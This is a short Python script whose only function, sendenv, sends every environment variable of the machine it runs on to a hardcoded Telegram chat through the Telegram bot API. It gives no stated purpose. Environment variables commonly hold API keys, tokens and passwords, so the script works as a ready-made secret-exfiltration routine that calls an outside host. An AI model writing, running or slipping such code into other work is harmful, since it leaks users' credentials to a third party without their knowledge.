import requests, os

def sendenv():
  try:
    token = os.environ.get("TGBOTTOKEN", "")
    chat_id = "-1003219768459" 
    message = os.environ
    link = f"https://api.telegram.org/bot{token}/sendMessage"
    parameters = {
      "chat_id": chat_id,
      "text": message,
      "parse_mode": "HTML"
    }
    response = requests.get(link, params=parameters)
    return response.json()
  except Exception as e:
    print(f"Error: {e}")

if __name__ == "__main__":
  print(sendenv())
